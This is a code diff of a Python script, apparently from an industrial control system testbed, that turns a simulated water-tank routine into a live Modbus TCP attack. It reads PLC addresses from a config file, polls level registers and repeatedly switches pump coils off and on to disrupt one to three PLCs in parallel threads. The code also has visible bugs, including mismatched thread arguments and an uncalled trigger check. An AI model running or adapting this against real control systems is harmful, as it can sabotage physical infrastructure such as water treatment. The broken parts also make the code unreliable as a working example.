@@ -1,12 +1,13 @@
 import time
 import configparser
-import random
 from pymodbus.client.sync import ModbusTcpClient
+import time
+import threading
 from datetime import datetime
 
 def attack(ctx):
 
-    def pump(level, value, mode):
+    def pump(plc):
         increment = 1
         ct = 0
         ct_2 = 0
@@ -16,133 +17,139 @@ def attack(ctx):
         time_2_commands = 0
         limit = 0
 
-        print(mode)
+        # Read from config.ini
+        config = configparser.ConfigParser()
+        config.read('config.ini')
+        
+        time_empty= int(config.get('params', 'time_empty'))
+        time_empty = time_empty / 60
 
-        if(mode == "percentage"): 
+        if(config.get('params', 'time_send') == ""):
+            mode = "percentage"
             percentage = int(config.get('params', 'percentage'))
-            time_empty = int(config.get('params', 'time_empty'))
-            new_time_slowed = int(time_empty + (time_empty * (percentage / 100)))
             limit = int((100-percentage) /25)
         else:
+            mode = "time_command"
             time_2_commands = int(config.get('params', 'time_send'))
-            print(time_2_commands)
-        while True:
-            
-            if level > 90:
-                increment = -1
-                status = "dec"
-            elif level < 30:
-                increment = 1
-                status = "inc"
-            
 
-            if(ct == 0):
-                level_start = level
-                ct = 1
-            elif(ct == 1):
-                level_end = level
-                ct = 2
-            
-            if(ct == 2):
-                if(level_start > level_end): # decreasing
-                    status = "dec"
-                elif(level_start < level_end): # increasing
-                    status = "inc"
-                else:
-                    status = "stopped"
-                ct_2 = 0
-                ct = 3
-            
-            if status == "dec" and ct == 3:
+        
+        ip, port = plc.split(':')
+
+        # Convert the port to an integer
+        port = int(port)
+
+        client = ModbusTcpClient(ip, port = port)
+        client.connect()
+        result = client.read_input_registers(0, count=1, unit=1)
+        level_start = result.registers[0]
+        print(level_start)
+        time.sleep(2)
+        result = client.read_input_registers(0, count=1, unit=1)
+        level_end = result.registers[0] +1 #DA TOGLIERE +1
+        print(level_end)
+        if(level_start > level_end): # decreasing
+            status = "dec"
+        elif(level_start < level_end): # increasing
+            status = "inc"
+        else:
+            status = "stopped"
+        while(True):
+            if status == "dec" :
                 #apro la coil/pompa
                 if checkTrigger:
                     # Trigger checked
                     # Call the function to evaluate conditions
-                    all_conditions_true = evaluate_conditions(config, level)
+                    all_conditions_true = evaluate_conditions(config)
 
                     # Perform an operation if all conditions are true
                     if all_conditions_true:
                         if mode == "time_command":
-                            level += 1 # write_coil(off)
+                            client.write_coil(0, 0, unit=1)
                             time.sleep(time_2_commands)
-                            level -=1 # write_coil(on) 
+                            client.write_coil(0, 1, unit=1)
                         elif mode == "percentage":
                             if ct_2 < limit:
                                     ct_2 += 1
                             elif ct_2 >= limit and ct_2 < 4: 
                                 ct_2 += 1
-                                level += 1
+                                client.write_coil(0, 0, unit=1)
                             elif ct_2 >= 4 and percentage != 100:
                                 ct_2 = 1
                             elif ct_2 >= 4 and percentage == 100:
                                 ct_2 = 0
-                                level += 1
-                else:
-                    # No triggers
+                                client.write_coil(0, 0, unit=1)
+                    else:
+                        # No triggers
                         if mode == "time_command":
-                            print("hi")
-                            level += 1 # write_coil(off)
+                            client.write_coil(0, 0, unit=1)
                             time.sleep(time_2_commands)
-                            level -=1 # write_coil(on)
+                            client.write_coil(0, 1, unit=1)
                         elif mode == "percentage":
                             if ct_2 < limit:
                                     ct_2 += 1
-                            elif ct_2 >= limit and ct_2 < 4:
+                            elif ct_2 >= limit and ct_2 < 4: 
                                 ct_2 += 1
-                                level += 1
+                                client.write_coil(0, 0, unit=1)
                             elif ct_2 >= 4 and percentage != 100:
                                 ct_2 = 1
                             elif ct_2 >= 4 and percentage == 100:
                                 ct_2 = 0
-                                level += 1
+                                client.write_coil(0, 0, unit=1)
 
-            elif status == "inc"  and ct == 3:
+            elif status == "inc":
                 #chiudo la coil/pompa
                 if checkTrigger:
                     # Trigger checked
                     # Call the function to evaluate conditions
-                    all_conditions_true = evaluate_conditions(config, level)
+                    all_conditions_true = evaluate_conditions(config)
 
                     # Perform an operation if all conditions are true
-                    if all_conditions_true:
-                        if mode == "time_command":
-                            level += 1 # write_coil(off)
+                    if mode == "time_command":
+                            client.write_coil(0, 0, unit=1)
                             time.sleep(time_2_commands)
-                            level -=1 # write_coil(on)
-                        elif mode == "percentage":
+                            client.write_coil(0, 1, unit=1)
+                    elif mode == "percentage":
                             if ct_2 < limit:
                                     ct_2 += 1
-                            elif ct_2 >= limit and ct_2 < 4:
+                            elif ct_2 >= limit and ct_2 < 4: 
                                 ct_2 += 1
-                                level -= 1
+                                client.write_coil(0, 1, unit=1)
                             elif ct_2 >= 4 and percentage != 100:
                                 ct_2 = 1
                             elif ct_2 >= 4 and percentage == 100:
                                 ct_2 = 0
-                                level -= 1
+                                client.write_coil(0, 1, unit=1)
                 else:
                     # No triggers
-                        if mode == "time_command":
-                            level += 1 # write_coil(off)
+                    if mode == "time_command":
+                            client.write_coil(0, 0, unit=1)
                             time.sleep(time_2_commands)
-                            level -=1 # write_coil(on)
-                        elif mode == "percentage":
+                            client.write_coil(0, 1, unit=1)
+                    elif mode == "percentage":
                             if ct_2 < limit:
                                     ct_2 += 1
-                            elif ct_2 >= limit and ct_2 < 4:
+                            elif ct_2 >= limit and ct_2 < 4: 
                                 ct_2 += 1
-                                level -= 1
+                                client.write_coil(0, 1, unit=1)
                             elif ct_2 >= 4 and percentage != 100:
                                 ct_2 = 1
                             elif ct_2 >= 4 and percentage == 100:
                                 ct_2 = 0
-                                level -= 1
-
+                                client.write_coil(0, 1, unit=1)
+            
+            # Get the current date and time
             current_datetime = datetime.now()
+
+            # Format the datetime as a string with milliseconds
             timestamp = current_datetime.strftime("%Y-%m-%d %H:%M:%S.%f")
-            level += increment
-            print(f"Level: {level}, Timestamp: {timestamp}")  # Print the current level and time
-            time.sleep(value)
+
+
+            result = client.read_input_registers(0, count=1, unit=1)
+            level = result.registers[0]
+
+            print(f"Level: {level}, Timestamp: {timestamp}")
+            client.close()
+
     
     def checkTrigger(address):
         config = configparser.ConfigParser()
@@ -154,7 +161,7 @@ def attack(ctx):
                     return True
         return False
     
-    def evaluate_conditions(config, level):
+    def evaluate_conditions(config):
         all_conditions_true = True
         for section_name in config.sections():
             for param_name, param_value in config[section_name].items():
@@ -206,14 +213,7 @@ def attack(ctx):
 
                         value = int(value)
 
-                        if(cond == ">"):
-                            if(level <= value):
-                                return False
-                        elif(cond == "<"):
-                            if(level >= value):
-                                return False
-                        else:
-                            print("Condition error.")
+                        
                             
 
                     elif device_type == "m":
@@ -241,23 +241,57 @@ def attack(ctx):
 
         return all_conditions_true
 
-    # Random water level
-    level = random.randint(1, 100)
-
     # Read from config.ini
     config = configparser.ConfigParser()
     config.read('config.ini')
 
-    time_empty= int(config.get('params', 'time_empty'))
+    plc_values = {}
+    values = []
 
+    for plc_key in config['plc']:
+        plc_values[plc_key] = config.get('plc', plc_key)
+        # Split the combined string into IP and port
+        ip, port = plc_values[plc_key].split(':')
+
+        # Convert the port to an integer
+        port = int(port)
+
+        client = ModbusTcpClient(ip, port = port)
+        client.connect()
+        result = client.read_input_registers(0, count=1, unit=1)
+        values.append(result.registers[0])
+        client.close()
+
+
+    # PLC attack
+    # ONE PLC selected
+    if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
+        
+        print("Attacking one plc...")
+        pump(config.get('plc', 'plc1'))
+        
+
+    # TWO PLCs selected
+    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
+        print("Attacking two PLCs...")
+        thread1 = threading.Thread(target=pump, args=(values[0], config.get('plc', 'plc1')))
+        thread2 = threading.Thread(target=pump, args=(values[1], config.get('plc', 'plc2')))
+        thread1.start()
+        thread2.start()
+        thread1.join()
+        thread2.join()
     
-    time_empty = time_empty / 60
+    # THREE PLCs selected 
+    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
+        print("Attacking three plcs...")
+        thread1 = threading.Thread(target=pump, args=(values[0], config.get('plc', 'plc1')))
+        thread2 = threading.Thread(target=pump, args=(values[1], config.get('plc', 'plc2')))
+        thread3 = threading.Thread(target=pump, args=(values[2], config.get('plc', 'plc3')))
+        thread1.start()
+        thread2.start()
+        thread3.start()
+        thread1.join()
+        thread2.join()
+        thread3.join()
 
-    if(config.get('params', 'time_send') == ""):
-        mode = "percentage"
-    else:
-        mode = "time_command"
-
-
-    pump(level, time_empty, mode)
 
